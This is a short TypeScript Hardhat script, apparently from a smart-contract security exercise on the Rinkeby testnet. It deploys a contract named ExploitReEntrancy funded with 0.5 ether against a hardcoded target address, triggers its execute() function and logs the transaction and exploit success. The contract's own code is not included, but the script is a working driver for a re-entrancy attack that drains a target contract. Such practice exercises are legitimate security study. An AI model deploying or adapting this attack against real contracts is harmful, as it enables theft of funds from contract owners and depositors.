import { ethers } from 'hardhat'
import { ExploitReEntrancy } from '../types/typechain/ExploitReEntrancy'

async function main() {
  const targetAddr = '0x58477789F8fAD35e5831EBb5C77ee263FA8e017e'

  const factory = await ethers.getContractFactory('ExploitReEntrancy')
  const exploit = (await factory.deploy(targetAddr, {
    value: ethers.utils.parseEther('0.5')
  })) as ExploitReEntrancy

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)
  console.log('Contract deployed, executing exploit...')
  const expTX = await exploit.execute()
  console.log('https://rinkeby.etherscan.io/tx/' + expTX.hash)
  await expTX.wait()
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
